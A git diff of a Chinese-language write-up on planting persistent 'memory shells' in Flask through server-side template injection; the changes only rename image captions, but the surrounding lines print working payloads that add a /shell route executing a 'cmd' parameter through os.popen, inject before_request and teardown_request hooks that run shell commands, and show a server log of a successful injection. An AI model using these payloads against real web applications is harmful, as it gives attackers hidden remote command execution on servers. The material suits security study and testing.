@@ -168,7 +168,7 @@ http://127.0.0.1:5000/?name={{url_for.__globals__['__builtins__']['eval']("app.a
 127.0.0.1 - - [02/Sep/2024 12:24:26] "GET /?name={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}} HTTP/1.1" 200 -
 ```
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 成功打入嘻嘻嘻嘻嘻嘻，我太开心啦
 
@@ -234,13 +234,13 @@ def before_request(self, f):
 
 > sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度
 
-![2](./assets/002.png)
+![image](./assets/002.png)
 
 
 
 得到之后加`payload`,一次打入二次回显即可
 
-![3](./assets/003.png)
+![image](./assets/003.png)
 
 ```
 url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda:__import__('os').popen('whoami').read())")
@@ -306,7 +306,7 @@ CmdResp = __import__('flask').make_response(
 
 而且我们知道这个是个恒真式，所以自然而然的就成功了
 
-![4](./assets/004.png)
+![image](./assets/004.png)
 
 成功打入
 
@@ -336,7 +336,7 @@ url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'
 
 反弹成功
 
-![5](./assets/005.png)
+![image](./assets/005.png)
 
 ```
 url_for.__globals__['__builtins__']['eval']("sys.modules['__main__'].__dict__['app'].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__('os').popen('ls > 11.txt').read())")
@@ -344,7 +344,7 @@ url_for.__globals__['__builtins__']['eval']("sys.modules['__main__'].__dict__['a
 
 成功打入，访问文件即可
 
-![6](./assets/006.png)
+![image](./assets/006.png)
 
 并且通过测试发现，这个文件的结果还是动态更新的，只要`flask`实例还在
 
@@ -484,7 +484,7 @@ if __name__ == '__main__':
 
 此时我们再打即可打通
 
-![7](./assets/007.png)
+![image](./assets/007.png)
 
 # 0x03 小结
 
